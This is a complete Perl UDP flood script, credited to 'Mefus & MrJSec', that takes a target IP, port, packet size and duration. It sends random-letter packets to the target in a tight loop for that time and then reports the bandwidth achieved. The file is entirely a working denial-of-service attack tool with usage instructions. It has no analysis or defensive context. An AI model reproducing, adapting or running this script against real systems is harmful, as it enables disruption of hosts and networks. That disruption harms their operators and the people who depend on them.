#!/usr/bin/perl

##
# Perl DoS by Mefus & MrJSec
# RIP Mefus <3
# Usage <ip> <port> <packet size> <time>
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$count);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip. \n";

$endtime = time() + $time;

socket(sckt, PF_INET, SOCK_DGRAM, 17);

print "Flooding $ip on port $port, with $size bytes for $time seconds. \n";

my @chars = ("A".."Z", "a".."z");
my $string;
$string .= $chars[rand @chars] for 1..$size;

$count = 0;

for (;time() <= $endtime; $count++) {
  send(sckt, $string, 0, pack_sockaddr_in($port, $iaddr));
  }

print "Flood Completed, ";
printf("%.2f", ((($count/$time)*($size*8))/1024/1024));
print " Mb/s. \n";
